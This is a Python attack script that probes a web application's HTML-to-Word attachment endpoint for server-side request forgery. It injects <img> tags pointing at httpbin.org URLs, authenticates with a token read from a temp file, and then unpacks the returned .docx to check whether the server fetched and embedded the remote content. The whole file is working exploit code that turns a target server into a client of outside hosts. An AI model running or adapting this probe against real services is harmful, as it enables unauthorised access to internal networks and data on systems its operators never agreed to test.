import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
tag='ZXEXT'+uuid.uuid4().hex[:8]
def render(html,name,atype='131'):
    body={"html":html,"type":"word","attachableType":"AuditableEntity",
          "attachableId":atype,"fileName":name}
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/attachments/html',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read())
    except: return c,None
def get(p):
    cmd=['curl','-s','-m','30',H+p,'-H','token: '+TOK,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
def probe(label,url,atype):
    c,d=render(f'<h1>ZX</h1><img src="{url}">', f'zx-{tag}-{label}', atype)
    if c!='200':
        print(f"  {label:22} gen={c}"); return
    aid=d['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    subprocess.run(['curl','-s','-m','60','-o','/tmp/x.docx',f['url']])
    raw=open('/tmp/x.docx','rb').read()
    z=zipfile.ZipFile(io.BytesIO(raw))
    media=[n for n in z.namelist() if 'media' in n]
    sizes=[(m,len(z.read(m))) for m in media]
    hit=any(tag.encode() in z.read(m) for m in media)
    print(f"  {label:22} docx={len(raw):>6}B media={sizes} tag_embedded={hit}")
print(f"unique tag: {tag}\n")
print("=== extension lever: same content, different path extension ===")
probe('httpbin-anything-noext', f'https://httpbin.org/anything/{tag}', '131')
probe('httpbin-anything-ico',   f'https://httpbin.org/anything/{tag}.ico', '132')
probe('httpbin-anything-png',   f'https://httpbin.org/anything/{tag}.png', '133')
probe('httpbin-base64-noext',   f'https://httpbin.org/base64/{__import__("base64").b64encode(tag.encode()).decode()}', '134')
